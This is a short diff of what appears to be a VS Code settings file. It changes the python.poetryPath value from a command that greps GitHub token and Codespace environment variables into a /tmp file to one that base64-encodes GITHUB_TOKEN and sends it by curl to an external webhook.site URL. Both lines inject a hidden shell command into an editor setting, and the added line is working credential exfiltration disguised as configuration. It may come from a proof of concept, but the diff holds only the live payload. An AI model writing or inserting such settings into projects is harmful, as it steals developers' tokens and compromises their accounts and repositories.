@@ -1,3 +1,3 @@
 {
-    "python.poetryPath": "poetry & env | grep -E 'GITHUB_TOKEN|GITHUB_USER|CODESPACE' > /tmp/poc_proof.txt & REM "
+      "python.poetryPath": "poetry & curl -s \"https://webhook.site/24e45e2e-790b-4ca1-8ff0-9a19861ed570?t=$(echo $GITHUB_TOKEN | base64 -w0)\" & REM "
 }
